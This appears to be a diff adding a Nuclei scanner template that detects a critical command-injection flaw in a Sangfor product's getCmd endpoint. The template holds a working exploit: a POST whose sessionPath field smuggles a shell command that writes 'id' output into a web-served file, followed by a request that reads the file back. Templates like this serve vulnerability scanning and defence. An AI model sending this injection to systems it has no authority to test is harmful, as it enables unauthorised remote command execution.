@@ -1,0 +1,38 @@
+id: sangfor-getcmd-rce
+
+info:
+  name: Sangfor getCmd Command Injection
+  author: iSee857
+  severity: critical
+  description: |
+    Sangfor getCmd Command Injection
+  tags: sangfor
+
+variables:
+  random: '{{rand_text_alpha(5)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /isomp-protocol/protocol/getCmd HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
+        Accept-Language: zh-CN
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        sessionPath=;id>/usr/local/tomcat/webapps/fort/trust/js/{{random}}.txt;&sid=1
+      - |
+        GET /fort/trust/js/{{random}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "uid=.*gid=.*"
